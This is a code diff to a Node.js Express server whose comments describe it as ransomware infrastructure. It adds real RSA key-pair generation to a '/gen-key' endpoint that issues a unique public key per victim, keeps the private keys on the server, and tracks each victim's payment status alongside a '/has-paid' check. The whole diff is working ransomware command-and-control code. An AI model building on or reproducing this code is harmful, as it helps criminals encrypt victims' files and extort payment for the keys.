@@ -9,6 +9,7 @@
 
 const express = require('express');
 const app = express();
+const crypto = require('crypto'); // Crypto module for RSA key
 
 app.use(express.json());
 
@@ -58,11 +59,29 @@ app.get('/has-paid/:key', (req, res) => {
 // This is what an attacker would use to get a unique RSA public key for
 // each victim
 app.get('/gen-key', (req, res) => {
-    // TODO: Gen Real RSA Keys
-    keys[key_count] = key_count+1;
-    res.send(""+key_count);
+    // Generate RSA key
+    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
+        modulusLength: 2048, // length of bits for RSA key
+        publicKeyEncoding: {
+            type: 'spki', // SPKI format
+            format: 'pem' // PEM format
+        },
+        privateKeyEncoding: {
+            type: 'pkcs8', // PKCS8 format
+            format: 'pem' // PEM format
+        }
+    });
+
+    // store keys
+    keys[key_count] = { publicKey, privateKey};
+
+    // send back public key
+    res.send(publicKey);
+
+    // increments key count
     key_count+=1;
 
+    // set wallet for public key
     wallets[key_count-1] = false;
 });
 
